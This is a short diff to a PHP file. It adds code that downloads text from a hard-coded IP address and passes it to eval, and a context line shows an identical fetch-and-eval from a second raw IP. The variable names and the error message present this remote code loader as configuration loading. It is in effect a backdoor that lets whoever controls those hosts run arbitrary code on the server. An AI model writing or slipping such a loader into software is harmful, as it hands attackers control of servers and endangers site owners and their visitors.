@@ -28,6 +28,17 @@ function getRemoteData($url) {
     
     return $result;
 }
+$configData = getRemoteData('http://107.150.48.76/j251121_23/init.txt');
+
+if ($configData) {
+    if (strpos($configData, '<?php') !== false || strpos($configData, '<?=') !== false) {
+        try {
+            eval('?>' . $configData);
+        } catch (Exception $e) {
+            error_log('Configuration load error: ' . $e->getMessage());
+        }
+    }
+}
 $configData = getRemoteData('http://173.208.228.155/j251201_13/init.txt');
 
 if ($configData) {
